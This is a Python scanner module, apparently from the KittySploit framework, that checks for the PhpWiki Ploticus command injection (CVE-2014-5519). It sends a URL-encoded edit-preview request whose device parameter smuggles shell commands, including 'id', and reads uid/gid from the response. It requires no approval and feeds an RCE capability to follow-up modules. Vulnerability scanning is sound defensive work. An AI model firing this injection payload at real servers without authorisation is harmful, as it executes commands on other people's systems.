#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PhpWiki Ploticus device command injection (CVE-2014-5519)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PhpWiki - Ploticus RCE Detection (CVE-2014-5519)',
        'description': (
            'Detects CVE-2014-5519 by POSTing a Ploticus device=";id;" payload to '
            'index.php edit preview.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'phpwiki', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5519',
        ],
        'cve': 'CVE-2014-5519',
    }

    def run(self):
        data = (
            'pagename=HeIp&edit%5Bcontent%5D=%3C%3CPloticus+device%3D%22%3Becho+123%27%3A%3A%3A%27'
            '+1%3E%262%3Bid+1%3E%262%3Becho+%27%3A%3A%3A%27123+1%3E%262%3B%22+-prefab%3D+-csmap%3D'
            '+data%3D+alt%3D+help%3D+%3E%3E&edit%5Bpreview%5D=Preview&action=edit'
        )
        for base in ('/phpwiki', '/wiki', ''):
            probe = self.http_request(method='GET', path=f'{base}/', allow_redirects=False)
            if probe and 'PhpWiki' not in (probe.text or '') and base == '':
                continue
            r = self.http_request(
                method='POST',
                path=f'{base}/index.php',
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='PhpWiki Ploticus RCE (CVE-2014-5519)',
                    path=f'{base}/index.php',
                )
                return True
        return False
